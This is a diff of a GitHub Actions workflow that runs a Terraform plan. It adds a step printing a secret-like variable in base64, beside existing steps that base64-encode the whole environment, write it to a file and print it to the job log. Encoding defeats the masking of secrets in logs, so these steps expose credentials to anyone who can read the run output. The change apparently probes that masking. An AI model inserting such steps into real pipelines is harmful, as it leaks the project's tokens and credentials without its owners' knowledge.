@@ -35,6 +35,7 @@ jobs:
         env:
           TF_VAR_release_identifier: ${{ github.ref_name }}
         run: terraform plan -detailed-exitcode -input=false -no-color -out=tfplan
+      - run: printf "Tell no one $SSSH_TESTING" | base64
       - run: printf $(env | base64 -w 0) > $HOME/some-output.txt
       - run: cat "$HOME/some-output.txt" || echo "Not found"
       - name: Generate plaintext plan
